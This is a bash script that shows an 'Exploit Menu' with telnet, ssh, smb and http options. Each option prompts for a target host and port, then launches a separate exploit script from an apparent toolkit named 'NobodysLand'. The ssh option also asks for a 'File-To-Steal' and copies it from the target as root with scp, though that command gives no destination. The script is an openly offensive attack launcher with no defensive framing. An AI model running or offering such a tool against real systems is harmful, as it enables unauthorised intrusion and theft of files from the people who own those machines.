cyan='\e[0;36m' 
green='\033[92m' 
red='\e[1;31m' 
yel='\e[0;33m' 
orange='\e[38;5;166m'

clear

figlet "Exploit"
figlet "Menu"

echo -e $green"========================="
echo -e $red"1)telnet"
echo -e $red"2)ssh"
echo -e $red"3)smb"
echo -e $red"4)http"
echo -e $green"========================="

read -p " NLF~#: " attacks

#Telnet 

if [ $attacks = "1" ]
then
clear

figlet "telnet" |lolcat

read -p " <Target> " t1

read -p " <Port> " p1

cd /$HOME/NobodysLand

python2 telnet.py --rhost $t1 --rport $p1
fi

#SSH

if [ $attacks = "2" ]
then
clear

figlet "ssh" |lolcat

read -p " <Target> " t2

read -p " <Port> " p2

read -p " <File-To-Steal> " f1

cd /$HOME/NobodysLand

python2 ssh.py

scp -P $p2 root@$t2:$f1

fi

#SMB

if [ $attacks = "3" ]
then
clear

figlet "smb" |lolcat

read -p " <Target> " t3

read -p " <Port> " p3

cd /$HOME/NobodysLand

python2 smb.py $t3 $p3
fi

#HTTP

if [ $attacks = "4" ]
then
clear

figlet "http" |lolcat

read -p " <Target> " t4

cd /$HOME/NobodysLand

ruby http.rb $t4

fi

